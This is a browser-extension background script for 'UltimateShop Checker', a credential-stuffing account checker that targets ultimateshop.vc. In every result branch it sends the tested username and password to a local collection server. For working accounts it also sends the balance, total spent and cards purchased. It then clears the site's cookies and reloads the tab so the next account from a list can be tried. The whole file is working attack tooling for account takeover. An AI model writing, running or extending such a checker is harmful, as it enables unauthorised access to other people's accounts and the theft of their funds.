// UltimateShop Checker Background Script
console.log('UltimateShop Background: Service worker loaded');

// Service worker lifecycle events
self.addEventListener('install', (event) => {
    console.log('UltimateShop Background: Service worker installed');
});

self.addEventListener('activate', (event) => {
    console.log('UltimateShop Background: Service worker activated');
});

self.addEventListener('error', (event) => {
    console.error('UltimateShop Background: Service worker error:', event.error);
});

self.addEventListener('unhandledrejection', (event) => {
    console.error('UltimateShop Background: Unhandled rejection:', event.reason);
});

// Main message listener
try {
    chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {
        console.log('UltimateShop Background: Received message:', message.type);
        
        if (message.type === 'hit_detected') {
            // Report hit account to server
            fetch('http://localhost:5050/report-hit', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    username: message.username,
                    password: message.password,
                    balance: message.balance,
                    totalSpent: message.totalSpent,
                    cardsPurchased: message.cardsPurchased,
                    comboCheck: message.comboCheck,
                    totalCaptures: message.totalCaptures
                })
            }).then(response => {
                if (response.ok) {
                    console.log('UltimateShop Background: Hit reported successfully');
                } else {
                    console.error('UltimateShop Background: Failed to report hit');
                }
            }).catch(error => {
                console.error('UltimateShop Background: Error reporting hit:', error);
            });
            
            // Clear cookies for ultimateshop.vc
            chrome.cookies.getAll({ domain: 'ultimateshop.vc' }, (cookies) => {
                cookies.forEach(cookie => {
                    const url = `https://${cookie.domain}${cookie.path}`;
                    chrome.cookies.remove({ url, name: cookie.name });
                });
                console.log('Cleared cookies for ultimateshop.vc');
                
                // Auto-refresh current tab for new account
                setTimeout(() => {
                    chrome.tabs.reload(sender.tab.id, () => {
                        console.log('Tab refreshed for new account:', sender.tab.id);
                    });
                }, 2000); // Wait 2 seconds before refresh
            });
            
        } else if (message.type === 'fail_detected') {
            // Report failed account to server
            fetch('http://localhost:5050/report-fail', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    username: message.username,
                    password: message.password,
                    reason: message.reason || 'Login failed'
                })
            }).then(response => {
                if (response.ok) {
                    console.log('UltimateShop Background: Fail reported successfully');
                } else {
                    console.error('UltimateShop Background: Failed to report fail');
                }
            }).catch(error => {
                console.error('UltimateShop Background: Error reporting fail:', error);
            });
            
            // Clear cookies for ultimateshop.vc
            chrome.cookies.getAll({ domain: 'ultimateshop.vc' }, (cookies) => {
                cookies.forEach(cookie => {
                    const url = `https://${cookie.domain}${cookie.path}`;
                    chrome.cookies.remove({ url, name: cookie.name });
                });
                console.log('Cleared cookies for ultimateshop.vc');
                
                // Auto-refresh current tab for new account
                setTimeout(() => {
                    chrome.tabs.reload(sender.tab.id, () => {
                        console.log('Tab refreshed for new account:', sender.tab.id);
                    });
                }, 2000); // Wait 2 seconds before refresh
            });
            
        } else if (message.type === 'banned_detected') {
            // Report banned account to server
            fetch('http://localhost:5050/report-banned', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    username: message.username,
                    password: message.password
                })
            }).then(response => {
                if (response.ok) {
                    console.log('UltimateShop Background: Banned account reported successfully');
                } else {
                    console.error('UltimateShop Background: Failed to report banned account');
                }
            }).catch(error => {
                console.error('UltimateShop Background: Error reporting banned account:', error);
            });
            
            // Clear cookies for ultimateshop.vc
            chrome.cookies.getAll({ domain: 'ultimateshop.vc' }, (cookies) => {
                cookies.forEach(cookie => {
                    const url = `https://${cookie.domain}${cookie.path}`;
                    chrome.cookies.remove({ url, name: cookie.name });
                });
                console.log('Cleared cookies for ultimateshop.vc');
                
                // Auto-refresh current tab for new account
                setTimeout(() => {
                    chrome.tabs.reload(sender.tab.id, () => {
                        console.log('Tab refreshed for new account:', sender.tab.id);
                    });
                }, 2000); // Wait 2 seconds before refresh
            });
            
        } else if (message.type === 'clear_cookies_and_close') {
            // Clear cookies and close tab
            chrome.cookies.getAll({ domain: 'ultimateshop.vc' }, (cookies) => {
                cookies.forEach(cookie => {
                    const url = `https://${cookie.domain}${cookie.path}`;
                    chrome.cookies.remove({ url, name: cookie.name });
                });
                console.log('Cleared cookies for ultimateshop.vc');
                
                // Close the tab
                chrome.tabs.remove(sender.tab.id, () => {
                    console.log('Tab closed after cookie clear:', sender.tab.id);
                });
            });
        }
        
        // Always send response
        sendResponse({ status: 'received' });
    });
} catch (error) {
    console.error('UltimateShop Background: Error in message listener:', error);
}